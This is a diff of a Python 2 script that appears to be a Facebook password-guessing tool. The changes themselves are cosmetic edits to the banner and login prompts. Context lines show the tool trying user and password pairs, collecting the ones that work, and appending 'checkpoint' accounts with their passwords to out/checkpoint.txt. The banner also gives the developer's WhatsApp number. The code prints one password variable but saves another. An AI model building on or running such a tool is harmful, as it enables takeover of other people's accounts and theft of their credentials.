@@ -50,9 +50,9 @@ def jalan(z):
 		time.sleep(0.1)
 ##### INTRO #####
 logo ="""
-\r\x1b[1;93m      𝘿𝙚𝙫𝙚𝙡𝙥𝙤𝙧: 𝙃𝙐𝙕𝘼𝙄𝙁𝘼 𝘽𝘼𝙇𝙊𝘾𝙃 
-\r\x1b[1;93m      𝙜𝙞𝙩𝙝𝙪𝙗: 𝙜𝙞𝙩𝙝𝙪𝙗.𝙘𝙤𝙢/𝙃𝙐𝙕41𝙁4 
-\r\x1b[1;93m      𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋: 03087584706    
+\r\x1b[1;93m       𝘿𝙚𝙫𝙚𝙡𝙥𝙤𝙧: 𝙃𝙐𝙕𝘼𝙄𝙁𝘼 𝘽𝘼𝙇𝙊𝘾𝙃 
+\r\x1b[1;93m       𝙜𝙞𝙩𝙝𝙪𝙗: 𝙜𝙞𝙩𝙝𝙪𝙗.𝙘𝙤𝙢/𝙃𝙐𝙕41𝙁4 
+\r\x1b[1;93m       𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋: 03087584706    
 \r\x1b[1;93m           𝘼𝙡𝙡 𝙧𝙞𝙜𝙝𝙩 𝙧𝙚𝙨𝙚𝙧𝙫𝙚     """
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -100,7 +100,7 @@ def login():
      	
 		
 		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mUse a New Account To Login' )
-		jalan(' \033[1;97m   ✧ \033[1;97m👉 : \033[1;97mBUZAIFA BALOCH' ) 
+		jalan(' \033[1;97m   ✧ \033[1;97m👉 : \033[1;97mHUZAIFA BALOCH' ) 
 		
 		print('	' )
 		print('      \033[1;97m      ✧ \x1b[1;97mLogin With Facebook\x1b[1;97m ✧')
@@ -319,7 +319,7 @@ def pilih_super():
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m✮\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass1 + ' \x1b[1;97m✮\x1b[1;97m ' 	
+									print '\x1b[1;97mCheckpoint\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass1 + ' \x1b[1;97m\x1b[1;97m ' 	
 									cek = open("out/checkpoint.txt", "a")
 									cek.write(user+"|"+pass3+"\n")
 									cek.close()
